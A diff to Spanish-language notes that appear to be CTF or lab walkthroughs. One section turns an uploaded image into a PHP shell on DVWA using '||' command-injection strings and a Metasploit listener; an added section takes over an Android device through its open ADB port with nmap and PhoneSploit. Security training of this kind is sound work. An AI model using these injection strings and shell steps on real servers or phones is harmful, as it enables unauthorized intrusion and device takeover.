@@ -354,9 +354,20 @@ Aplicación para aprender lenguajes: SoloLearn para móviles.
  4. Ponemos la escucha en metasploit con el multi/handler y le damos las características que hemos indicado en la creación del payload.
  5. Buscamos el fichero para poder modificar la extensión con el comando: '|| dir c:\ /s | findstr "shell.jpg"'
  6. La ruta en la que está es c:\wamp64\www\DVWA\hackable\uploads\shell.jpg.
- 7. Para modificar el nombre usamos el comando: copy c:\wamp64\www\DVWA\hackable\uploads\shell.jpg c:\wamp64\www\DVWA\hackable\uploads\shell.php
+ 7. Para modificar el nombre usamos el comando: "|| copy c:\wamp64\www\DVWA\hackable\uploads\shell.jpg c:\wamp64\www\DVWA\hackable\uploads\shell.php"
  8. Accedemos al archivo a través de la página web y se nos creará una sesión de meterpreter en metasploit.
  9. Obtendremos la flag.
+ 
+ 
+ Android
+ -------
+ 1. Hacemos un escaneo para ver los puertos que tiene abiertos. Escaneo: nmap -A -Pn [IP] -oN android
+ 2. Vemos que tiene abierto el puerto el puerto 5555 que es ADB.
+ 3. Instalamos adb en parrot con el comando: "apt install adb".
+ 4. Clonamos el repositorio de PhoneSploit: git clone https://github.com/01010000-kumar/PhoneSploit
+ 5. Ejecutamos PhoneSploit con el comando: python3 phonesploit.py
+ 6. Nos conectamos al dispositivo introduciendo su IP.
+ 7. Elegimos la opción 4 para navegar por la shell.
  
  
  
